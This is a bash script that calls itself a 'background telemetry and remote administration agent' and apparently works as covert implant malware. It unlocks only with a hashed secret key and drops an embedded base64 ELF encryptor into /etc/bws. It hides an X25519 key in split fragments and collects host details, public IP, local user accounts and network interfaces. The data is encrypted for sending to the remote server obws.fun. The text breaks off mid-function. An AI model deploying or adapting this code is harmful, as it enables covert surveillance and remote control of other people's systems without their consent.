#!/bin/bash
# =============================================================================
# Project.....: bws - Background Telemetry & Remote Administration Agent
# Build.......: 20260621
# =============================================================================

# ─── Ativacao via chave de ambiente ──────────────────────────────────────
OSBIN_HASH="c2bc31baa3e1037c3480ebcf0523a613c8d36e61d3918a7379345017c5918706"

if [ -z "$osbin" ]; then
    echo "license required..."
    exit 1
fi

CHECK_HASH=$(echo -n "$osbin" | sha256sum | cut -d' ' -f1)
if [ "$CHECK_HASH" != "$OSBIN_HASH" ]; then
    echo "license required..."
    exit 2
fi

# ─── Caminhos ────────────────────────────────────────────────────────────
BWS_DIR="/etc/bws"
AGENT_ID_FILE="${BWS_DIR}/agent.id"
TIMER_FILE="${BWS_DIR}/last_push"
BWS_BIN=$(readlink -f "$0" 2>/dev/null || echo "/usr/local/bin/bws")
SERVER="https://obws.fun"

# ─── X25519 Public Key (obfuscated) ──────────────────────────────────────
_pk_a="ea0f9ee5de0f9af9"
_pk_b="e56fd67568cc28c5"
_pk_c="4e627ab07ebda382"
_pk_d="a6571792bd1e797d"

# ─── Embedded bws_crypt helper (base64) ──────────────────────────────────
BWS_CRYPT_B64="f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAIBUAAAAAAABAAAAAAAAAAEgxAAAAAAAAAAAAAEAA
OAANAEAAHQAcAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAA
AAAAAAgAAAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwA
AAAAAAAAAQAAAAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPgJAAAAAAAA
+AkAAAAAAAAAEAAAAAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAGQYAAAAA
AAAZBgAAAAAAAAAQAAAAAAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAADQAQAA
AAAAANABAAAAAAAAABAAAAAAAAABAAAABgAAAEgtAAAAAAAASD0AAAAAAABIPQAAAAAAAMgC
AAAAAAAACAMAAAAAAAAAEAAAAAAAAAIAAAAGAAAAWC0AAAAAAABYPQAAAAAAAFg9AAAAAAAA
AAIAAAAAAAAAAgAAAAAAAAgAAAAAAAAABAAAAAQAAAA4AwAAAAAAADgDAAAAAAAAOAMAAAAA
AAAwAAAAAAAAADAAAAAAAAAACAAAAAAAAAAEAAAABAAAAGgDAAAAAAAAaAMAAAAAAABoAwAA
AAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAAAFPldGQEAAAAOAMAAAAAAAA4AwAAAAAAADgD
AAAAAAAAMAAAAAAAAAAwAAAAAAAAAAgAAAAAAAAAUOV0ZAQAAAC0IAAAAAAAALQgAAAAAAAA
tCAAAAAAAAA0AAAAAAAAADQAAAAAAAAABAAAAAAAAABR5XRkBgAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQEAAAASC0AAAAAAABIPQAA
AAAAAEg9AAAAAAAAuAIAAAAAAAC4AgAAAAAAAAEAAAAAAAAAL2xpYjY0L2xkLWxpbnV4LXg4
Ni02NC5zby4yAAAAAAAEAAAAIAAAAAUAAABHTlUAAgAAwAQAAAADAAAAAAAAAAKAAMAEAAAA
AQAAAAAAAAAEAAAAFAAAAAMAAABHTlUAqRoJtXSbdVqiDOVtDCrw6L4ZwokEAAAAEAAAAAEA
AABHTlUAAAAAAAMAAAACAAAAAAAAAAAAAAADAAAAEgAAAAEAAAAGAAAAAAGhAIABEAISAAAA
FAAAAAAAAAAoHYwc0WXObWZVYRA58oscAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI4A
AAASAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAASAAAAAAAAAAAAAAAAAAAAAAAAAMIAAAASAAAA
AAAAAAAAAAAAAAAAAAAAAAEAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAOUAAAASAAAAAAAAAAAA
AAAAAAAAAAAACAEAAIASAAAAAAAAAAAAAAAAAAAAAAAAAB0AAAAgAAAAAAAAAAAAAAAAAAAA
AAAAAEYAAAASAAAAAAAAAAAAAAAAAAAAAAAAAFkAAAASAAAAAAAAAAAAAAAAAAAAAAAAALsA
AAASAAAAAAAAAAAAAAAAAAAAAAAAAH4AAAASAAAAAAAAAAAAAAAAAAAAAAAAAOwAAAASAAAA
AAAAAAAAAAAAAAAAAAAAAG8AAAASAAAAAAAAAAAAAAAAAAAAAAAAAAEBAAASAAAAAAAAAAAA
AAAAAAAAAAAAACwAAAAgAAAAAAAAAAAAAAAAAAAAAAAAANQAAAASAAAAAAAAAAAAAAAAAAAA
AAAAAKAAAAASAAAAAAAAAAAAAAAAAAAAAAAAANkAAAARABoAIEAAAAAAAAAIAAAAAAAAAKwA
AAAiAAAAAAAAAAAAAAAAAAAAAAAAAPQAAAARABoAMEAAAAAAAAAIAAAAAAAAAPoAAAARABoA
QEAAAAAAAAAIAAAAAAAAAABfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX19nbW9uX3N0
YXJ0X18AX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBjcnlwdG9fYm94X2tleXBhaXIAY3J5
cHRvX3NlY3JldGJveF9lYXN5AHNvZGl1bV9oZXgyYmluAHJhbmRvbWJ5dGVzX2J1ZgBjcnlw
dG9fc2NhbGFybXVsdABzb2RpdW1faW5pdABfX2N4YV9maW5hbGl6ZQBtYWxsb2MAX19saWJj
X3N0YXJ0X21haW4AZ2V0YwBzdGRvdXQAZnJlZQBzdHJsZW4AcmVhbGxvYwBzdGRpbgBzdGRl
cnIAZndyaXRlAF9fc3RhY2tfY2hrX2ZhaWwAbGlic29kaXVtLnNvLjIzAGxpYmMuc28uNgBH
TElCQ18yLjQAR0xJQkNfMi4zNABHTElCQ18yLjIuNQAAAAEAAgADAAEAAgAEAAEAAQABAAIA
AQACAAEAAgABAAIAAQACAAIAAgACAAEAAwApAQAAEAAAAAAAAAAUaWkNAAAEADMBAAAQAAAA
tJGWBgAAAwA9AQAAEAAAAHUaaQkAAAIASAEAAAAAAABIPQAAAAAAAAgAAAAAAAAAABYAAAAA
AABQPQAAAAAAAAgAAAAAAAAAwBUAAAAAAAAIQAAAAAAAAAgAAAAAAAAACEAAAAAAAADYPwAA
AAAAAAYAAAADAAAAAAAAAAAAAADgPwAAAAAAAAYAAAAEAAAAAAAAAAAAAADoPwAAAAAAAAYA
AAAHAAAAAAAAAAAAAADwPwAAAAAAAAYAAAAPAAAAAAAAAAAAAAD4PwAAAAAAAAYAAAATAAAA
AAAAAAAAAAAgQAAAAAAAAAUAAAASAAAAAAAAAAAAAAAwQAAAAAAAAAUAAAAUAAAAAAAAAAAA
AABAQAAAAAAAAAUAAAAVAAAAAAAAAAAAAABwPwAAAAAAAAcAAAABAAAAAAAAAAAAAAB4PwAA
AAAAAAcAAAACAAAAAAAAAAAAAACAPwAAAAAAAAcAAAAFAAAAAAAAAAAAAACIPwAAAAAAAAcA
AAAGAAAAAAAAAAAAAACQPwAAAAAAAAcAAAAIAAAAAAAAAAAAAACYPwAAAAAAAAcAAAAJAAAA
AAAAAAAAAACgPwAAAAAAAAcAAAAKAAAAAAAAAAAAAACoPwAAAAAAAAcAAAALAAAAAAAAAAAA
AACwPwAAAAAAAAcAAAAMAAAAAAAAAAAAAAC4PwAAAAAAAAcAAAANAAAAAAAAAAAAAADAPwAA
AAAAAAcAAAAOAAAAAAAAAAAAAADIPwAAAAAAAAcAAAAQAAAAAAAAAAAAAADQPwAAAAAAAAcA
AAARAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
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
KgAASI01gioAAEgp/kiJ8EjB7j9IwfgDSAHGSNH+dBRIiwVFKgAASIXAdAj/4GYPH0QAAMMP
H4AAAAAA8w8e+oA9fSoAAAB1K1VIgz0iKgAAAEiJ5XQMSIs9JioAAOgZ+///6GT////GBVUq
AAABXcMPHwDDDx+AAAAAAPMPHvrpd////wAAAPMPHvpIg+wISIPECMMAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAc29kaXVtX2luaXQg
ZmFpbGVkCgBpbnZhbGlkIHNlcnZlciBwdWJrZXkgaGV4CgBtYWxsb2MgZmFpbGVkCgByZWFs
bG9jIGZhaWxlZAoAY3J5cHRvX3NjYWxhcm11bHQgZmFpbGVkCgBjcnlwdG9fc2VjcmV0Ym94
X2Vhc3kgZmFpbGVkCgAAAAAAAAB1c2FnZTogYndzX2NyeXB0IDxzZXJ2ZXJfcHViX2hleD4K
AAABGwM7MAAAAAUAAABs7///ZAAAAEzw//+MAAAAXPD//6QAAAAs8f//vAAAAGz0//9MAAAA
FAAAAAAAAAABelIAAXgQARsMBwiQAQAAFAAAABwAAAAY9P//JgAAAABEBxAAAAAAJAAAADQA
AAAA7///4AAAAAAOEEYOGEoPC3cIgAA/GjoqMyQiAAAAABQAAABcAAAAuO///xAAAAAAAAAA
AAAAABQAAAB0AAAAsO///9AAAAAAAAAAAAAAAFgAAACMAAAAaPD//z4DAAAARg4QjwJCDhiO
A0IOII0EQg4ojAVBDjCGBkQOOIMHSQ6AAgJ8Cg44RA4wQQ4oQg4gQg4YQg4QQg4IQQtGDogC
Sg6QAlQOiAJBDoACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABYAAAAAAADAFQAAAAAAAAEA
AAAAAAAAGQEAAAAAAAABAAAAAAAAACkBAAAAAAAADAAAAAAAAAAAEAAAAAAAAA0AAAAAAAAA
DBYAAAAAAAAZAAAAAAAAAEg9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAAUD0AAAAA
AAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAACwAwAAAAAAAAUAAAAAAAAA+AUAAAAAAAAGAAAA
AAAAAOgDAAAAAAAACgAAAAAAAABUAQAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAA
AAAAAAAAAwAAAAAAAABYPwAAAAAAAAIAAAAAAAAAOAEAAAAAAAAUAAAAAAAAAAcAAAAAAAAA
FwAAAAAAAADACAAAAAAAAAcAAAAAAAAAuAcAAAAAAAAIAAAAAAAAAAgBAAAAAAAACQAAAAAA
AAAYAAAAAAAAAB4AAAAAAAAACAAAAAAAAAD7//9vAAAAAAEAAAgAAAAA/v//bwAAAAB4BwAA
AAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAAEwHAAAAAAAA+f//bwAAAAADAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAWD0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAMBAAAAAAAABAEAAA
AAAAAFAAAAAAAAAQEAAAAAAAAGAQAAAAAAAAcBAAAAAAAACAEAAAAAAAAJAAAAAAAAAoBAAA
AAAAALAQAAAAAAAAwBAAAAAAAADQEAAAAAAAAOAQAAAAAAAA8BAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIQAAAAAAAAEdDQzogKFVi
dW50dSAxMS40LjAtMXVidW50dTF+MjIuMDQuMykgMTEuNC4wAAAuc2hzdHJ0YWIALmludGVy
cAAubm90ZS5nbnUucHJvcGVydHkALm5vdGUuZ251LmJ1aWxkLWlkAC5ub3RlLkFCSS10YWcA
LmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IA
LnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAucGx0LnNlYwAudGV4dAAuZmlu
aQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2Fy
cmF5AC5keW5hbWljAC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAQAAAAIA
AAAAAAAAGAMAAAAAAAAYAwAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
EwAAAAcAAAACAAAAAAAAADgDAAAAAAAAOAMAAAAAAAAwAAAAAAAAAAAAAAAAAAAACAAAAAAA
AAAAAAAAAAAAACYAAAAHAAAAAgAAAAAAAABoAwAAAAAAAGgDAAAAAAAAJAAAAAAAAAAAAAAA
AAAAAAQAAAAAAAAAAAAAAAAAAAA5AAAABwAAAAIAAAAAAAAAjAMAAAAAAACMAwAAAAAAACAA
AAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARwAAAPb//28CAAAAAAAAALADAAAAAAAA
sAMAAAAAAAA0AAAAAAAAAAYAAAAAAAAACAAAAAAAAAAAAAAAAAAAAFEAAAALAAAAAgAAAAAA
AADoAwAAAAAAAOgDAAAAAAAAEAIAAAAAAAAHAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABZAAAA
AwAAAAIAAAAAAAAA+AUAAAAAAAD4BQAAAAAAAFQBAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAA
AAAAAAAAGAAAAP///28CAAAAAAAAAEwHAAAAAAAATAcAAAAAAAAsAAAAAAAAAAYAAAAAAAAA
AgAAAAAAAAACAAAAAAAAAG4AAAD+//9vAgAAAAAAAAB4BwAAAAAAAHgHAAAAAAAAQAAAAAAA
AAAHAAAAAQAAAAgAAAAAAAAAAAAAAAAAAAB9AAAABAAAAAIAAAAAAAAAuAcAAAAAAAC4BwAA
AAAAAAgBAAAAAAAABgAAAAAAAAAIAAAAAAAAABgAAAAAAAAAhwAAAAQAAABCAAAAAAAAAMAI
AAAAAAAAMAgAAAAAAAA4AQAAAAAAAAYAAAAYAAAACAAAAAAAAAAYAAAAAAAAAJEAAAABAAAA
BgAAAAAAAAAAIAAAAAAAACAAAAAAAAAbAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAA
AIwAAAABAAAABgAAAAAAAAAgEAAAAAAAACAQAAAAAAAA4AAAAAAAAAAAAAAAAAAAABAAAAAA
AAAAEAAAAAAAAACXAAAAAQAAAAYAAAAAAAAAABEAAAAAAAAAEQAAAAAAABAAAAAAAAAAAAAA
AAAAAAAQAAAAAAAAABAAAAAAAAAAoAAAAAEAAAAGAAAAAAAAABARAAAAAAAAEBEAAAAAAADQ
AAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAKkAAAABAAAABgAAAAAAAADgEQAAAAAA
AOARAAAAAAAAKQQAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACvAAAAAQAAAAYAAAAA
AAAADBYAAAAAAAAMFgAAAAAAAA0AAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAtQAA
AAEAAAACAAAAAAAAAAAgAAAAAAAAIAAAAP////8zAAAAAAAAAAAAAAAABwAAAAAAAAAAAAAA
AAAAAAAAAL0AAAABAAAAAgAAAAAAAAC0IAAAAAAAALQgAAAAAAAANAAAAAAAAAAAAAAAAAAA
AAQAAAAAAAAAAAAAAAAAAADLAAAAAQAAAAIAAAAAAAAA6CAAAAAAAADoIAAAAAAAAOgAAAAA
AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA1QAAAA4AAAADAAAAAAAAAEg9AAAAAAAASC0A
AAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOEAAAAPAAAAAwAAAAAAAABQ
PQAAAAAAAFAtAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADtAAAABgAA
AAMAAAAAAAAAWD0AAAAAAABYLQAAAAAAAAACAAAAAAAABwAAAAAAAAAIAAAAAAAAABAAAAAA
AAAAmwAAAAEAAAADAAAAAAAAAFg/AAAAAAAAWC8AAAAAAACoAAAAAAAAAAAAAAAAAAAACAAA
AAAAAAAIAAAAAAAAAPYAAAABAAAAAwAAAAAAAAAAQAAAAAAAAAAwAAAAAAAAEAAAAAAAAAAA
AAAAAAAAAAgAAAAAAAAAAAAAAAAAAAD8AAAACAAAAAMAAAAAAAAAIEAAAAAAAAAQMAAAAAAA
ADAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAQEAAAEAAAAwAAAAAAAAAAAA
AAAAAAAQIDAAAAAAAAAtAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAADAAAA
AAAAAAAAAAAAAAAAAAAAQD0wAAAAAAAACgEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAA"

_ensure_crypt_helper() {
    local helper="${BWS_DIR}/bws_crypt"
    if [ -x "$helper" ]; then
        echo "$helper"
        return 0
    fi
    mkdir -p "$BWS_DIR" 2>/dev/null || true
    echo "$BWS_CRYPT_B64" | base64 -d > "$helper" 2>/dev/null
    chmod 755 "$helper" 2>/dev/null
    if [ -x "$helper" ]; then
        echo "$helper"
        return 0
    fi
    echo ""
    return 1
}

encrypt_payload() {
    local plaintext="$1"
    local hex="${_pk_a}${_pk_b}${_pk_c}${_pk_d}"
    local helper
    helper=$(_ensure_crypt_helper)
    if [ -z "$helper" ]; then
        echo ""
        return 1
    fi
    echo "$plaintext" | "$helper" "$hex" | base64 -w0 2>/dev/null
}

# ─── Agent ID ────────────────────────────────────────────────────────────
_ensure_agent_id() {
    if [ ! -f "$AGENT_ID_FILE" ]; then
        mkdir -p "$BWS_DIR" 2>/dev/null || true
        local id
        id=$(cat /etc/machine-id 2>/dev/null | sha256sum | cut -c1-16)
        [ -z "$id" ] && id=$(openssl rand -hex 8 2>/dev/null)
        echo "$id" > "$AGENT_ID_FILE"
    fi
}

_get_agent_id() {
    _ensure_agent_id
    cat "$AGENT_ID_FILE" 2>/dev/null || echo "unknown"
}

# ─── Telemetry Collection ────────────────────────────────────────────────
collect_telemetry() {
    local ts hostname user uptime_sec os kernel cpu_cores mem_total swap_total
    local disks ip_addr

    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null)
    hostname=$(hostname 2>/dev/null)
    user=$(whoami 2>/dev/null)
    uptime_sec=$(awk '{print int($1)}' /proc/uptime 2>/dev/null)
    os=$(cat /etc/os-release 2>/dev/null | grep "^PRETTY_NAME" | cut -d'"' -f2)
    [ -z "$os" ] && os=$(uname -s 2>/dev/null)
    kernel=$(uname -r 2>/dev/null)
    cpu_cores=$(nproc 2>/dev/null)
    mem_total=$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
    swap_total=$(awk '/SwapTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
    disks=$(df -h --total 2>/dev/null | grep "^total" | awk '{print $2, $3, $4, $5}')
    ip_addr=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || \
              curl -s --max-time 5 https://ifconfig.me 2>/dev/null || \
              echo "unknown")

    local agent_id
    agent_id=$(_get_agent_id)

    cat << EOF
{"agent_id":"${agent_id}","ts":"${ts}","hostname":"${hostname}","user":"${user}","uptime":${uptime_sec:-0},"os":"${os}","kernel":"${kernel}","cpu_cores":${cpu_cores:-0},"mem_mb":${mem_total:-0},"swap_mb":${swap_total:-0},"disk":"${disks}","ip":"${ip_addr}"}
EOF
}

# ─── Full registration (extended telemetry + push) ───────────────────────
collect_full_registration() {
    local agent_id
    agent_id=$(_get_agent_id)

    local ts hostname user uptime_sec os kernel cpu_cores mem_total swap_total disks ip_addr
    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null)
    hostname=$(hostname 2>/dev/null)
    user=$(whoami 2>/dev/null)
    uptime_sec=$(awk '{print int($1)}' /proc/uptime 2>/dev/null)
    os=$(cat /etc/os-release 2>/dev/null | grep "^PRETTY_NAME" | cut -d'"' -f2)
    [ -z "$os" ] && os=$(uname -s 2>/dev/null)
    kernel=$(uname -r 2>/dev/null)
    cpu_cores=$(nproc 2>/dev/null)
    mem_total=$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
    swap_total=$(awk '/SwapTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
    disks=$(df -h --total 2>/dev/null | grep "^total" | awk '{print $2, $3, $4, $5}')
    ip_addr=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || \
              curl -s --max-time 5 https://ifconfig.me 2>/dev/null || \
              echo "unknown")

    local users_list interfaces ssh_attempts
    users_list=$(awk -F: '$3>=1000 || $3==0 {printf "%s(uid=%d) ", $1, $3}' /etc/passwd 2>/dev/null)
    interfaces=$(ip -4 addr show 2>/dev/null | grep inet | awk '{print $2}' | tr '\n' ' ')
